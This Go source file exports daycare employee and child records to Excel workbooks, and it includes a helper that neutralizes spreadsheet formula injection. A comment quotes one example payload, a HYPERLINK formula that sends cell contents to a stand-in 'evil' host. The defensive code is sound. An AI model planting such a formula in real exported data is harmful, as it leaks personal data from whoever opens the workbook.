package export

import (
	"fmt"
	"io"
	"strings"
	"time"

	"github.com/xuri/excelize/v2"

	"github.com/eenemeene/kitamanager-go/internal/models"
)

// excelDateFormat is the German date format for Excel cells.
const excelDateFormat = "DD.MM.YYYY"

// headerStyle returns the style ID for bold header cells with a light gray background.
func headerStyle(f *excelize.File) (int, error) {
	return f.NewStyle(&excelize.Style{
		Font: &excelize.Font{Bold: true},
		Fill: excelize.Fill{
			Type:    "pattern",
			Pattern: 1,
			Color:   []string{"#D9D9D9"},
		},
	})
}

// dateStyle returns the style ID for date cells formatted as DD.MM.YYYY.
func dateStyle(f *excelize.File) (int, error) {
	return f.NewStyle(&excelize.Style{
		CustomNumFmt: strPtr(excelDateFormat),
	})
}

// numberStyle returns the style ID for numeric cells with German formatting.
func numberStyle(f *excelize.File) (int, error) {
	return f.NewStyle(&excelize.Style{
		CustomNumFmt: strPtr("#,##0.00"),
	})
}

func strPtr(s string) *string { return &s }

// sanitizeCell neutralizes leading characters that Excel and LibreOffice
// interpret as formula triggers (=, +, -, @) or argument separators
// (\t, \r). A user-controlled tenant string like
// `=HYPERLINK("http://evil/?"&A1,"click")` would otherwise execute when a
// different user opens the exported workbook.
//
// The fix is the CSV-injection-standard: prepend an apostrophe so the cell
// reads as literal text. The apostrophe is not shown by Excel/LibreOffice
// but is visible in CSV and to text readers — acceptable tradeoff.
func sanitizeCell(s string) string {
	if s == "" {
		return s
	}
	switch s[0] {
	case '=', '+', '-', '@', '\t', '\r':
		return "'" + s
	}
	return s
}

// setStringCell writes a user-controllable string value with injection
// sanitization applied. Every cell that originates from tenant data MUST go
// through this helper rather than calling SetCellValue directly.
func setStringCell(f *excelize.File, sheet, c, value string) {
	_ = f.SetCellValue(sheet, c, sanitizeCell(value))
}

// genderDE maps English gender values to German.
func genderDE(g string) string {
	switch strings.ToLower(g) {
	case "male":
		return "männlich"
	case "female":
		return "weiblich"
	case "diverse":
		return "divers"
	default:
		return g
	}
}

// setDateCell writes a time.Time as an Excel date value with the date style.
func setDateCell(f *excelize.File, sheet, cell string, t time.Time, style int) {
	_ = f.SetCellValue(sheet, cell, t)
	_ = f.SetCellStyle(sheet, cell, cell, style)
}

// setOptionalDateCell writes a *time.Time, leaving the cell empty if nil.
func setOptionalDateCell(f *excelize.File, sheet, cell string, t *time.Time, style int) {
	if t != nil {
		setDateCell(f, sheet, cell, *t, style)
	}
}

// WriteEmployeesExcel renders employees as an XLSX workbook.
func WriteEmployeesExcel(w io.Writer, employees []models.EmployeeResponse) error {
	f := excelize.NewFile()
	defer f.Close()

	sheet := "Mitarbeiter"
	if err := f.SetSheetName("Sheet1", sheet); err != nil {
		return fmt.Errorf("set sheet name: %w", err)
	}

	headers := []string{
		"Vorname", "Nachname", "Geschlecht", "Geburtstag",
		"Gruppe", "Personalkategorie", "Stufe", "Entgeltgruppe",
		"Wochenstunden", "Vertrag von", "Vertrag bis",
	}
	widths := []float64{
		15, 18, 13, 14,
		18, 20, 8, 16,
		16, 14, 14,
	}

	hStyle, err := headerStyle(f)
	if err != nil {
		return fmt.Errorf("header style: %w", err)
	}
	dStyle, err := dateStyle(f)
	if err != nil {
		return fmt.Errorf("date style: %w", err)
	}
	nStyle, err := numberStyle(f)
	if err != nil {
		return fmt.Errorf("number style: %w", err)
	}

	// Write headers
	for i, h := range headers {
		cell, _ := excelize.CoordinatesToCellName(i+1, 1)
		_ = f.SetCellValue(sheet, cell, h)
		_ = f.SetCellStyle(sheet, cell, cell, hStyle)
		_ = f.SetColWidth(sheet, colLetter(i+1), colLetter(i+1), widths[i])
	}

	// Auto-filter on header row
	lastCol := colLetter(len(headers))
	_ = f.AutoFilter(sheet, "A1:"+lastCol+"1", nil)

	// Write data rows
	for i, emp := range employees {
		row := i + 2
		setStringCell(f, sheet, cell(1, row), emp.FirstName)
		setStringCell(f, sheet, cell(2, row), emp.LastName)
		setStringCell(f, sheet, cell(3, row), genderDE(emp.Gender))
		setDateCell(f, sheet, cell(4, row), emp.Birthdate, dStyle)

		if len(emp.Contracts) > 0 {
			ct := emp.Contracts[0]
			sectionName := ""
			if ct.SectionName != nil {
				sectionName = *ct.SectionName
			}
			setStringCell(f, sheet, cell(5, row), sectionName)
			setStringCell(f, sheet, cell(6, row), ct.StaffCategory)
			_ = f.SetCellValue(sheet, cell(7, row), ct.Step)
			setStringCell(f, sheet, cell(8, row), ct.Grade)

			_ = f.SetCellValue(sheet, cell(9, row), ct.WeeklyHours)
			_ = f.SetCellStyle(sheet, cell(9, row), cell(9, row), nStyle)

			setDateCell(f, sheet, cell(10, row), ct.From, dStyle)
			setOptionalDateCell(f, sheet, cell(11, row), ct.To, dStyle)
		}
	}

	_, err = f.WriteTo(w)
	return err
}

// WriteChildrenExcel renders children as an XLSX workbook.
func WriteChildrenExcel(w io.Writer, children []models.ChildResponse) error {
	f := excelize.NewFile()
	defer f.Close()

	sheet := "Kinder"
	if err := f.SetSheetName("Sheet1", sheet); err != nil {
		return fmt.Errorf("set sheet name: %w", err)
	}

	headers := []string{
		"Vorname", "Nachname", "Geschlecht", "Geburtstag",
		"Gruppe", "Vertrag von", "Vertrag bis",
		"Betreuungsumfang", "Zuschläge",
	}
	widths := []float64{
		15, 18, 13, 14,
		18, 14, 14,
		20, 25,
	}

	hStyle, err := headerStyle(f)
	if err != nil {
		return fmt.Errorf("header style: %w", err)
	}
	dStyle, err := dateStyle(f)
	if err != nil {
		return fmt.Errorf("date style: %w", err)
	}

	// Write headers
	for i, h := range headers {
		c, _ := excelize.CoordinatesToCellName(i+1, 1)
		_ = f.SetCellValue(sheet, c, h)
		_ = f.SetCellStyle(sheet, c, c, hStyle)
		_ = f.SetColWidth(sheet, colLetter(i+1), colLetter(i+1), widths[i])
	}

	// Auto-filter on header row
	lastCol := colLetter(len(headers))
	_ = f.AutoFilter(sheet, "A1:"+lastCol+"1", nil)

	// Write data rows
	for i, child := range children {
		row := i + 2
		setStringCell(f, sheet, cell(1, row), child.FirstName)
		setStringCell(f, sheet, cell(2, row), child.LastName)
		setStringCell(f, sheet, cell(3, row), genderDE(child.Gender))
		setDateCell(f, sheet, cell(4, row), child.Birthdate, dStyle)

		if len(child.Contracts) > 0 {
			ct := child.Contracts[0]
			sectionName := ""
			if ct.SectionName != nil {
				sectionName = *ct.SectionName
			}
			setStringCell(f, sheet, cell(5, row), sectionName)
			setDateCell(f, sheet, cell(6, row), ct.From, dStyle)
			setOptionalDateCell(f, sheet, cell(7, row), ct.To, dStyle)

			setStringCell(f, sheet, cell(8, row), ct.Properties.GetScalarProperty("care_type"))

			supplements := ct.Properties.GetArrayProperty("supplements")
			setStringCell(f, sheet, cell(9, row), strings.Join(supplements, ", "))
		}
	}

	_, err = f.WriteTo(w)
	return err
}

// cell returns the Excel cell reference for the given 1-based column and row.
func cell(col, row int) string {
	name, _ := excelize.CoordinatesToCellName(col, row)
	return name
}

// colLetter returns the Excel column letter for the given 1-based column index.
func colLetter(col int) string {
	name, _ := excelize.ColumnNumberToName(col)
	return name
}
